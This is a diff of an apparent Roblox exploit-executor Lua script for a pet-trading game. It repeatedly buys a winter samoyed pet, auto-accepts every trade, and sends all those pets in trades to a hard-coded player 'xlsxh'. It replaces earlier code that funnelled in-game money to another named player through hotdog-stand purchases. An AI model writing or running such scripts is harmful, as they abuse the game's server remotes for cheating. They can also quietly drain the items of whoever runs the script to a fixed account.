@@ -6,6 +6,8 @@ local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
 local ClientData = Fsys("ClientData")
 local get = Fsys("RouterClient").get
 
+local License = require(game:GetService("ReplicatedStorage").SharedModules.TradeLicenseHelper)
+
 function ButtonClick(Path)
 	firesignal(Path["MouseButton1Down"])
 	firesignal(Path["MouseButton1Click"])
@@ -49,19 +51,9 @@ end
 repeat wait()
 until not LocalPlayer.PlayerGui.NewsApp.Enabled
 
-wait(20)
+wait(15)
 
 get("TeamAPI/ChooseTeam"):InvokeServer("Babies",{dont_respawn = true})
-
-wait(1)
-
-for a,b in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.toys) do
-	if b.kind == "hotdog_stand" then
-		get("ToolAPI/Equip"):InvokeServer(b.unique)
-		get("PlaceableToolAPI/CreatePlaceable"):InvokeServer(LocalPlayer.Character.Head.CFrame)
-		get("PlaceableToolAPI/SetRefreshmentPrice"):InvokeServer("hotdog_stand",50)
-	end
-end
 
 wait(1)
 
@@ -248,6 +240,14 @@ spawn(function()
 	end
 end)
 
+
+spawn(function()
+	while wait(1) do
+		get("TradeAPI/AcceptNegotiation"):FireServer()
+		get("TradeAPI/ConfirmTrade"):FireServer()
+	end
+end)
+
 spawn(function()
 	while wait(3) do
 		if ClientData.get_data()[LocalPlayer.Name].money >= 550 then
@@ -256,20 +256,42 @@ spawn(function()
 	end
 end)
 
-get("WinterEventAPI/AdventCalendarTryTakeReward"):InvokeServer(25)
+pettt = "winter_2025_samoyed"
 
 spawn(function()
-	while wait() do
-		if game:GetService("Players"):WaitForChild("FdxFvi") and game.Players.LocalPlayer.Name ~= "FdxFvi" then
-			for i=1, 3 do
-				local args = {
-					"hotdog_stand",
-					game:GetService("Players"):WaitForChild("FdxFvi"),
-					50
-				}
-				get("PlaceableToolAPI/BuyRefreshment"):InvokeServer(unpack(args))
+	while wait(0.1) do
+		local args = {
+			"pets",
+			"winter_2025_samoyed",
+			{
+				buy_count = 1
+			}
+		}
+		get("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+	end
+end)
+
+local LocalPlayer = game.Players.LocalPlayer
+local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
+local ClientData = Fsys("ClientData")
+local get = Fsys("RouterClient").get
+
+spawn(function()
+	while wait(1) do
+		for i,v in pairs(game.Players:GetChildren()) do
+			if v.Name == "xlsxh" then
+				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("xlsxh"))
+				
+				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
+					if v["kind"] == "winter_2025_samoyed" then
+						wait()
+						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+					end
+				end
+				
+				get("TradeAPI/AcceptNegotiation"):FireServer()
+				get("TradeAPI/ConfirmTrade"):FireServer()
 			end
-			wait(130)
 		end
 	end
 end)
